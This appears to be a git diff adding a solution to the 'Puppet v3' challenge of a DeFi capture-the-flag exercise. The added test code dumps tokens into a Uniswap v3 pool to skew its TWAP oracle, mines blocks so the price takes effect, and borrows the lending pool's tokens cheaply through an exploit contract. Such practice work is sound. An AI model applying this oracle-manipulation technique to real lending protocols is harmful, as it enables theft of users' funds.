@@ -1,6 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
-const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { time, setBalance, mine } = require("@nomicfoundation/hardhat-network-helpers");
 
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
@@ -8,6 +8,7 @@ const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol
 
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
+const { increase } = require('@nomicfoundation/hardhat-network-helpers/dist/src/helpers/time');
 bn.config({ EXPONENTIAL_AT: 999999, DECIMAL_PLACES: 40 });
 function encodePriceSqrt(reserve0, reserve1) {
     return ethers.BigNumber.from(
@@ -26,7 +27,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "http://127.0.0.1:8545/";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -70,7 +71,7 @@ describe('[Challenge] Puppet v3', function () {
 
         // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        
+
         // Create the Uniswap v3 pool
         uniswapPositionManager = new ethers.Contract("0xC36442b4a4522E871399CD717aBDD847Ab11FE88", positionManagerJson.abi, deployer);
         const FEE = 3000; // 0.3%
@@ -89,7 +90,7 @@ describe('[Challenge] Puppet v3', function () {
         );
         uniswapPool = new ethers.Contract(uniswapPoolAddress, poolJson.abi, deployer);
         await uniswapPool.increaseObservationCardinalityNext(40);
-        
+
         // Deployer adds liquidity at current price to Uniswap V3 exchange
         await weth.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
         await token.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
@@ -105,7 +106,7 @@ describe('[Challenge] Puppet v3', function () {
             amount0Min: 0,
             amount1Min: 0,
             deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
-        }, { gasLimit: 5000000 });        
+        }, { gasLimit: 5000000 });
 
         // Deploy the lending pool
         lendingPool = await (await ethers.getContractFactory('PuppetV3Pool', deployer)).deploy(
@@ -140,6 +141,23 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("tokens in uniswap pool:", ethers.utils.formatEther(await token.balanceOf(uniswapPool.address)));
+        console.log("ether required before:", ethers.utils.formatEther(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)));
+        const exp = await (await ethers.getContractFactory('PuppetV3PoolExp', deployer)).deploy(
+            token.address,
+            lendingPool.address,
+        );
+        await token.connect(player).approve(exp.address, ethers.constants.MaxUint256);
+        await exp.connect(player).swap(await token.balanceOf(player.address), true, 1);
+        console.log("ether required:", ethers.utils.formatEther(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)));
+        var poolWethBalace = await weth.balanceOf(uniswapPool.address);
+        console.log('poolWethBalace', ethers.utils.formatEther(poolWethBalace));
+        var poolTokenBalace = await token.balanceOf(uniswapPool.address);
+        console.log('poolTokenBalace', ethers.utils.formatEther(poolTokenBalace));
+
+        await mine(70) // 等待价格生效
+        console.log("ether required:", ethers.utils.formatEther(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)));
+        await exp.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
